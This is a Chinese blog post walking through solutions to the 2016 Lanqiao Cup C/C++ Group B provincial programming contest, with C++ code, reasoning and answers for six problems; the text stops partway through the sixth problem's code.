    <title>2016年第七届蓝桥杯C/C++B组省赛题目解析</title>
    <link href="https://zss192.github.io/2021/04/13/2016%E5%B9%B4%E7%AC%AC%E4%B8%83%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AFCB%E7%BB%84%E7%9C%81%E8%B5%9B%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90/"/>
    <id>https://zss192.github.io/2021/04/13/2016%E5%B9%B4%E7%AC%AC%E4%B8%83%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AFCB%E7%BB%84%E7%9C%81%E8%B5%9B%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90/</id>
    <published>2021-04-13T13:44:58.000Z</published>
    <updated>2021-06-10T10:21:06.786Z</updated>
    
    <content type="html"><![CDATA[<h1>1.煤球数目</h1><p>有一堆煤球，堆成三角棱锥形。具体：第一层放1个，第二层3个（排列成三角形），第三层6个（排列成三角形），第四层10个（排列成三角形），…如果一共有100层，共有多少个煤球？</p><p>请填表示煤球总数目的数字。注意：你提交的应该是一个整数，不要填写任何多余的内容或说明性文字。</p><ul><li><strong>思路</strong>：分别是1、3、6、10…，其实就是找规律，可以看出来每次+2、+3、+4…即An=An-1+n</li></ul><p>❗注意让求得是煤球的总数，而不是第100层煤球的数量，千万要注意</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> n,sum;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">100</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        n+=i;</span><br><span class="line">        sum+=n;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;sum&lt;&lt;endl;  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>答案：171700</p><h1>2.生日蜡烛</h1><p>某君从某年开始每年都举办一次生日party，并且每次都要吹熄与年龄相同根数的蜡烛。</p><p>现在算起来，他一共吹熄了236根蜡烛。</p><p>请问，他从多少岁开始过生日party的？</p><p>请填写他开始过生日party的年龄数。注意：你提交的应该是一个整数，不要填写任何多余的内容或说明性文字。</p><ul><li><strong>思路一</strong>：数据量不大，暴力枚举一个一个试就行。两个for循环，第一个循环表示起始吹蜡烛年数，第二个表示一直吹多少年，不断求和直到sum=236</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">100</span>; i++)   <span class="comment">//从i岁开始吹蜡烛</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i; j &lt; <span class="number">100</span>; j++)   <span class="comment">//从i岁吹到某一岁使得sum=236</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum+=j;</span><br><span class="line">            <span class="keyword">if</span>(sum==<span class="number">236</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                cout&lt;&lt;i&lt;&lt;endl;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;       </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>思路二</strong>：可以看出来年龄其实是等差数列，也可以利用等差数列求和公式计算。前n项和公式为：Sn=n*a1+n(n-1)d/2</li></ul><p>其实也是通过枚举a1和n来求解</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> a1 = <span class="number">1</span>; a1 &lt; <span class="number">100</span>; a1++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> n = <span class="number">1</span>; n &lt; <span class="number">100</span>; n++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>((n*a1+n*(n<span class="number">-1</span>)*<span class="number">0.5</span>)==<span class="number">236</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                cout&lt;&lt;a1&lt;&lt;endl;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;      </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>答案：26</p><h1>3.凑算式</h1><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210413214246886.png"  alt="在这里插入图片描述"></p><p>这个算式中A<sub>I代表1</sub>9的数字，不同的字母代表不同的数字。</p><p>比如：6+8/3+952/714 就是一种解法，5+3/1+972/486 是另一种解法。</p><p>这个算式一共有多少种解法？</p><p>注意：你提交应该是个整数，不要填写任何多余的内容或说明性文字。</p><ul><li><strong>思路一</strong>：这题和2015年的第三题三羊献瑞类似。都是全排列问题。</li></ul><p>当然如果忘了全排列函数，直接9个for循环也能解，这里就不写这种解题代码了，注意不要都用int类型(int的8/7=1)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">double</span> nums[]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line"><span class="keyword">double</span> sum;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">double</span> temp=nums[<span class="number">0</span>]+nums[<span class="number">1</span>]/nums[<span class="number">2</span>]+(nums[<span class="number">3</span>]*<span class="number">100</span>+nums[<span class="number">4</span>]*<span class="number">10</span>+nums[<span class="number">5</span>])/(nums[<span class="number">6</span>]*<span class="number">100</span>+nums[<span class="number">7</span>]*<span class="number">10</span>+nums[<span class="number">8</span>]);</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++) <span class="comment">//输出下所有符合条件的排列情况，便于判断程序对错</span></span><br><span class="line">            &#123;</span><br><span class="line">                cout&lt;&lt;nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">            cout&lt;&lt;endl;</span><br><span class="line">            sum++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="built_in">next_permutation</span>(nums,nums+<span class="number">9</span>));    <span class="comment">//不会这个函数的去搜下，这里能排列出1~9所有的排列组合</span></span><br><span class="line">    cout&lt;&lt;sum&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>思路二</strong>：和15年第三题一样，这里也可以用dfs进行全排列，这里写下只是为了熟练下dfs，实际上用全排列函数解题速度更快</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> res;</span><br><span class="line"><span class="keyword">bool</span> visited[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">double</span> nums[<span class="number">10</span>];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">double</span> nums[])</span>   <span class="comment">//检查nums数组中的排列是否和为10</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> temp=nums[<span class="number">0</span>]+nums[<span class="number">1</span>]/nums[<span class="number">2</span>]+(nums[<span class="number">3</span>]*<span class="number">100</span>+nums[<span class="number">4</span>]*<span class="number">10</span>+nums[<span class="number">5</span>])/(nums[<span class="number">6</span>]*<span class="number">100</span>+nums[<span class="number">7</span>]*<span class="number">10</span>+nums[<span class="number">8</span>]);</span><br><span class="line">    <span class="keyword">if</span>(temp==<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> step)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(step==<span class="number">9</span>&amp;&amp;<span class="built_in">check</span>(nums))    <span class="comment">//如果已经选了9个数并且和为10则res++</span></span><br><span class="line">    &#123;</span><br><span class="line">        res++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">9</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])</span><br><span class="line">        &#123;</span><br><span class="line">            visited[i]=<span class="literal">true</span>;</span><br><span class="line">            nums[step]=i;   <span class="comment">//将选取的数存到nums数组中，当选好9个数的时候对nums数组中的数求和即可</span></span><br><span class="line">            <span class="built_in">dfs</span>(step+<span class="number">1</span>);</span><br><span class="line">            visited[i]=<span class="literal">false</span>;</span><br><span class="line">            <span class="comment">//nums[step]=0; //解释下这里为什么不用写这句话将nums[step]置0，因为dfs相当于一条路走到黑</span></span><br><span class="line">                            <span class="comment">//比如之前选了nums[2]=3,那么之后该为nums[3]赋值，nums[4]赋值...也就是这一条路nums[2]已经确定了</span></span><br><span class="line">                            <span class="comment">//如果函数从dfs(step+1)退出来时，说明nums[2]=3已经用过了，接下来的for循环会重新为nums[2]赋值</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">dfs</span>(<span class="number">0</span>);</span><br><span class="line">    cout&lt;&lt;res&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>4.快速排序</h1><p>排序在各种场合经常被用到。快速排序是十分常用的高效率的算法。</p><p>其思想是：先选一个“标尺”，用它把整个队列过一遍筛子，以保证：其左边的元素都不大于它，其右边的元素都不小于它。</p><p>这样，排序问题就被分割为两个子区间。再分别对子区间排序就可以了。</p><p>下面的代码是一种实现，请分析并填写划线部分缺少的代码。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t = a[i];</span><br><span class="line">    a[i] = a[j];</span><br><span class="line">    a[j] = t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">partition</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> p, <span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = p;</span><br><span class="line">    <span class="keyword">int</span> j = r + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> x = a[p];</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;r &amp;&amp; a[++i]&lt;x);</span><br><span class="line">        <span class="keyword">while</span>(a[--j]&gt;x);</span><br><span class="line">        <span class="keyword">if</span>(i&gt;=j) <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">swap</span>(a,i,j);</span><br><span class="line">    &#125;</span><br><span class="line">    ______________________;</span><br><span class="line">    <span class="keyword">return</span> j;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quicksort</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> p, <span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p&lt;r)&#123;</span><br><span class="line">        <span class="keyword">int</span> q = <span class="built_in">partition</span>(a,p,r);</span><br><span class="line">        <span class="built_in">quicksort</span>(a,p,q<span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">quicksort</span>(a,q+<span class="number">1</span>,r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> a[] = &#123;<span class="number">5</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">24</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">19</span>,<span class="number">27</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">17</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> N = <span class="number">12</span>;</span><br><span class="line">    <span class="built_in">quicksort</span>(a, <span class="number">1</span>, N<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;N; i++) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>思路</strong>：只要会快排的思想就不难，选定第一个表示a[p]p=0，即第一个元素，i从数组前面向后移，j从数组后面向前移动。</li></ul><p>i停在比a[p]大的位置，j停在比a[p]小的位置，交换他俩的位置，到i&gt;=j的时候停止移动，这时候，p位置到j位置是小于a[p]的元素，j+1位置到r位置都是大于a[p]的元素，该段代码的目的是标尺的左边都是小于它的数，右边都是大于它的数，所以要将p位置的元素和j位置的元素进行交换。</p><p>答案：swap(a,j,p)</p><h1>5.抽签</h1><p>X星球要派出一个5人组成的观察团前往W星。</p><p>其中：A国最多可以派出4人。</p><p>B国最多可以派出2人。</p><p>C国最多可以派出2人。</p><p>…</p><p>那么最终派往W星的观察团会有多少种国别的不同组合呢？</p><p>下面的程序解决了这个问题。数组a[] 中既是每个国家可以派出的最多的名额。程序执行结果为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">DEFFF</span><br><span class="line">CEFFF</span><br><span class="line">CDFFF</span><br><span class="line">CDEFF</span><br><span class="line">CCFFF</span><br><span class="line">CCEFF</span><br><span class="line">CCDFF</span><br><span class="line">CCDEF</span><br><span class="line">BEFFF</span><br><span class="line">BDFFF</span><br><span class="line">BDEFF</span><br><span class="line">BCFFF</span><br><span class="line">BCEFF</span><br><span class="line">BCDFF</span><br><span class="line">BCDEF</span><br><span class="line">....</span><br><span class="line">(以下省略，总共<span class="number">101</span>行)</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUF 1024</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> k, <span class="keyword">int</span> m, <span class="keyword">char</span> b[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(k==N)&#123; </span><br><span class="line">        b[M] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(m==<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,b);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;=a[k]; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;i; j++) b[M-m+j] = k+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        ______________________;  <span class="comment">//填空位置</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="keyword">int</span>  a[N] = &#123;<span class="number">4</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">3</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> b[BUF];</span><br><span class="line">    <span class="built_in">f</span>(a,<span class="number">0</span>,M,b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仔细阅读代码，填写划线部分缺少的内容。</p><p>注意：不要填写任何已有内容或说明性文字。</p><ul><li><strong>思路</strong>：查看代码，典型的dfs用到了递归思想(如果不自己调用自己一个输出函数怎么能输出那么多行呢)。</li></ul><p>然后答案肯定是f(x,x,x,x)的形式，第一个参数和第四个参数都是数组，一般都不会变动，即f(a,x,x,b)</p><p>重点在中间两个参数，这时重点关注递归函数的退出条件</p><p>if(k==N)也就是if(k==6)而刚开始传的k=0，有5个国家，现在k=6就会退出，显然k代表当前选取的国家是哪个(0代表国家A)，所以现在可得到f(a,k+1,x,b)</p><p>第三个参数肯定和m有关，接着看退出条件if(m==0)，也就是说如果前5个国家都选好了人数并且m=0的时候就会输出b。</p><p>而m刚开始传入的值是5，显然m表示的是当前还需要再选的人数</p><p>观察填空位置附近的代码，第一个for循环表示k国家派的人数为i，第二个for循环表示将派的人数存到b数组中</p><p>我们知道m一定是做减操作，i表示派的人数，m表示还需派的人数，所以传入m-i表示选取了i个人后还需再选多少人</p><blockquote><p>这题如果看出来是dfs，就m的判断条件有点难度，如果实在没分析出来，大不了随便多试几次</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUF 1024</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> k, <span class="keyword">int</span> m, <span class="keyword">char</span> b[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(k==N)&#123;   <span class="comment">//如果所有国家都已经选好人</span></span><br><span class="line">        b[M] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(m==<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,b);  <span class="comment">//如果还需0个人即已经选了5个人则输出b数组</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;=a[k]; i++)&#123; <span class="comment">//遍历k国家派的人数</span></span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;i; j++) b[M-m+j] = k+<span class="string">&#x27;A&#x27;</span>;  <span class="comment">//派出的人存入b数组</span></span><br><span class="line">        <span class="built_in">f</span>(a,k+<span class="number">1</span>,m-i,b);  <span class="comment">//填空位置</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>  a[N] = &#123;<span class="number">4</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">3</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> b[BUF];</span><br><span class="line">    <span class="built_in">f</span>(a,<span class="number">0</span>,M,b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>答案：f(a,k+1,m-i,b)</p><h1>6.方格填数</h1><p>如下的10个格子</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2021041321432383.png"  alt="在这里插入图片描述"></p><p>填入0~9的数字。要求：连续的两个数字不能相邻。（左右、上下、对角都算相邻）</p><p>一共有多少种可能的填数方案？</p><p>请填写表示方案数目的整数。注意：你提交的应该是一个整数，不要填写任何多余的内容或说明性文字。</p><p>❗题目没说明可不可以填重复的，实际上是不能填重复的，如果可以重复，这题难度会大大增加</p><ul><li><strong>思路一</strong>：全排列</li></ul><p>既然是填数，那就可以用全排列，把所有的排列组合列出来然后筛选出符合要求的排列组合</p><p>假设从左到右从上到下依次是nums[0]、nums[1]…</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210413214333114.png"  alt="在这里插入图片描述"></p><p>在这里检验函数我用了4个if判断，注意要判断特殊情况，如和左边相比时nums[3]不用和nums[2]比较</p><p>同样，也可以直接手写一个一个判断</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> nums[<span class="number">10</span>]=&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> res;</span><br><span 